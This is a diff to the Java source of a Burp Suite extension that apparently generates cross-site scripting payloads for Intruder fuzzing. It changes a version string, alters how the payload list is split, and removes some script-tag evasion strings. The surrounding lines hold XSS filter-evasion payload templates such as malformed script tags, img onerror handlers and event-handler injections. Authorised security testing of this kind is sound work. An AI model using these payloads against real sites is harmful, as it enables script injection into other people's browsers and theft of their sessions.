@@ -32,7 +32,7 @@ import burp.ITab;
 
 public class BurpExtender implements IBurpExtender, ITab, IHttpListener,
 IIntruderPayloadGeneratorFactory, IIntruderPayloadProcessor {
-    private static final String VERSION = "2.1.0";
+    private static final String VERSION = "1.2.0";
 
     class IntruderPayloadGenerator implements IIntruderPayloadGenerator {
 
@@ -52,8 +52,12 @@ IIntruderPayloadGeneratorFactory, IIntruderPayloadProcessor {
                     .split(",");
             this.eventHandler = extenderInstance.eventHandlerTextfield
                     .getText().split(",");
-            this.PAYLOADS = extenderInstance.attackStringsTextarea.getText()
-                    .split("\r\n");
+
+            // Add extra newline before processing to ensure that we can
+            // grab the last item from the list.
+            
+            String payloads = extenderInstance.attackStringsTextarea.getText() + "\n";
+            this.PAYLOADS = payloads.split("\n");
 
         }
 
@@ -160,12 +164,9 @@ IIntruderPayloadGeneratorFactory, IIntruderPayloadProcessor {
             ("\\\";" + BurpExtender.JAVASCRIPT_PLACEHOLDER + ";//").getBytes(),
             ("<STYLE TYPE=\"text/javascript\">"
                 + BurpExtender.JAVASCRIPT_PLACEHOLDER + ";</STYLE>").getBytes(),
-            ("<scr%0aipt>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "</scr%0aipt>").getBytes(),
-            ("<scr%0aipt>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "</scr%0aipt>").getBytes(),
             ("<<SCRIPT>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "//<</SCRIPT>").getBytes(),
             ("\"" + BurpExtender.EVENTHANDLER_PLACEHOLDER + "="
                     + BurpExtender.JAVASCRIPT_PLACEHOLDER + " ").getBytes(),
-            ("<scr\nipt>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "</scr\nipt>").getBytes(),
             ("<<SCRIPT>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "//<</SCRIPT>").getBytes(),
             ("<img src=\"1\" onerror=\"" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "\">").getBytes(),
             ("<img src='1' onerror='" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "'").getBytes(),
